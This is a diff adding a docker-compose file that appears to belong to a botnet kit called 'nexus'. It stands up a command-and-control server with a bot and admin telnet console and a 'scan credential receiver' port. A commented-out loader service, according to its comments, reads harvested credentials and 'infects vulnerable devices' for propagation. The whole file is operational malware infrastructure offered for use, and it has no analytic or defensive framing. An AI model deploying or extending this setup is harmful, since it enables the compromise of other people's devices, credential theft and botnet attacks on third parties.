@@ -1,0 +1,57 @@
+# ================================================================
+#  nexus — full stack compose
+#
+#  Starts the CNC server + an optional TCP loader (if you want).
+#  The scan listener pipes credential reports to the loader
+#  automatically via stdout redirection within the CNC process.
+#
+#  Usage:
+#    docker compose up -d                     # start everything
+#    docker compose logs -f cnc               # watch CNC output
+#    telnet localhost 19443                   # admin console
+#    docker compose down                      # stop everything
+# ================================================================
+
+version: "3.8"
+
+services:
+  # --- CNC server (bots + admin on :19443, scan listener on :48101) ---
+  cnc:
+    build: .
+    container_name: nexus-cnc
+    ports:
+      - "19443:19443"   # bots + admin telnet
+      - "48101:48101"   # scan credential receiver
+    volumes:
+      - nexus-data:/data
+    restart: unless-stopped
+    # Zero resource limits needed for the CNC — it's efficient.
+    # If you want to cap it:
+    # deploy:
+    #   resources:
+    #     limits:
+    #       memory: 256M
+    #       cpus: '0.5'
+
+  # --- Loader (optional — only needed if you're propagating) ---
+  # Uncomment this block if you want the loader to run alongside the CNC.
+  # The loader reads credential reports from the CNC's scan listener
+  # and infects vulnerable devices.
+  #
+  # loader:
+  #   build:
+  #     context: .
+  #     dockerfile: Dockerfile.loader
+  #   container_name: nexus-loader
+  #   depends_on:
+  #     - cnc
+  #   volumes:
+  #     - dlr-bins:/dlr/release:ro
+  #   restart: unless-stopped
+  #   stdin_open: true  # required — loader reads targets from stdin
+  #   # Pipe scan listener output to loader stdin:
+  #   # In production, use a named pipe or a small sidecar script.
+
+volumes:
+  nexus-data:
+  # dlr-bins:
